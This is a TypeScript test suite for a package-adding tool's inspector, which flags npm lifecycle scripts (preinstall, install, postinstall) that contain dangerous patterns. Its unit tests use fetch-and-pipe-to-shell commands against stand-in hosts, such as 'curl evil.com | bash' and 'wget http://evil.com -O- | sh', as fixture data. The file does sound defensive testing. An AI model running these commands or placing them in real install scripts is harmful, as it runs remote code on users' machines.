import { describe, it, expect } from "bun:test";
import fc from "fast-check";
import { inspectScripts, DANGEROUS_PATTERNS } from "../../src/add/script-inspector";

const LIFECYCLE = ["preinstall", "install", "postinstall"] as const;

// ── Property tests ────────────────────────────────────────────────────────────

describe("inspectScripts — properties", () => {
  // Feature: safe-add, Property 1: Scripts sin lifecycle no producen hallazgos
  it("package.json sin lifecycle scripts → array vacío", () =>
    fc.assert(
      fc.property(
        fc.dictionary(
          fc.string().filter((k) => !LIFECYCLE.includes(k as typeof LIFECYCLE[number])),
          fc.string(),
        ),
        (nonLifecycleScripts) => {
          const result = inspectScripts({ scripts: nonLifecycleScripts });
          return result.length === 0;
        }
      ),
      { numRuns: 100 }
    )
  );

  // Feature: safe-add, Property 1 (no scripts field)
  it("package.json sin campo scripts → array vacío", () =>
    fc.assert(
      fc.property(
        fc.record({ name: fc.string(), version: fc.string() }),
        (pkg) => inspectScripts(pkg as Record<string, unknown>).length === 0
      ),
      { numRuns: 100 }
    )
  );

  // Feature: safe-add, Property 2: Scripts sin patrones peligrosos no son DangerousScript
  it("lifecycle script sin patrones peligrosos → no aparece en resultado", () =>
    fc.assert(
      fc.property(
        fc.constantFrom(...LIFECYCLE),
        fc.string().filter((v) => !DANGEROUS_PATTERNS.some((p) => v.includes(p))),
        (scriptName, value) => {
          const result = inspectScripts({ scripts: { [scriptName]: value } });
          return result.length === 0;
        }
      ),
      { numRuns: 100 }
    )
  );
});

// ── Unit tests ────────────────────────────────────────────────────────────────

describe("inspectScripts — unit", () => {
  it("postinstall con curl → DangerousScript con pattern curl", () => {
    const result = inspectScripts({
      scripts: { postinstall: "curl evil.com | bash" },
    });
    expect(result).toHaveLength(1);
    expect(result[0]!.scriptName).toBe("postinstall");
    expect(result[0]!.patterns).toContain("curl");
    expect(result[0]!.patterns).toContain("bash");
  });

  it("preinstall con wget → detectado", () => {
    const result = inspectScripts({ scripts: { preinstall: "wget http://evil.com -O- | sh" } });
    expect(result[0]!.patterns).toContain("wget");
    expect(result[0]!.patterns).toContain("sh");
  });

  it("install con node -e → detectado", () => {
    const result = inspectScripts({ scripts: { install: "node -e 'require(\"fs\")'" } });
    expect(result[0]!.patterns).toContain("node -e");
  });

  it("scripts no-objeto (array) → retorna []", () => {
    expect(inspectScripts({ scripts: ["preinstall", "curl bad"] })).toEqual([]);
  });

  it("campo scripts ausente → retorna []", () => {
    expect(inspectScripts({ name: "test" })).toEqual([]);
  });

  it("scripts con campo scripts=null → retorna []", () => {
    expect(inspectScripts({ scripts: null })).toEqual([]);
  });

  it("non-lifecycle script con patrones → ignorado", () => {
    const result = inspectScripts({ scripts: { test: "curl evil.com" } });
    expect(result).toEqual([]);
  });

  it("múltiples lifecycle con patrones → múltiples DangerousScripts", () => {
    const result = inspectScripts({
      scripts: {
        preinstall: "curl evil.com",
        postinstall: "wget bad.com | bash",
      },
    });
    expect(result).toHaveLength(2);
  });
});
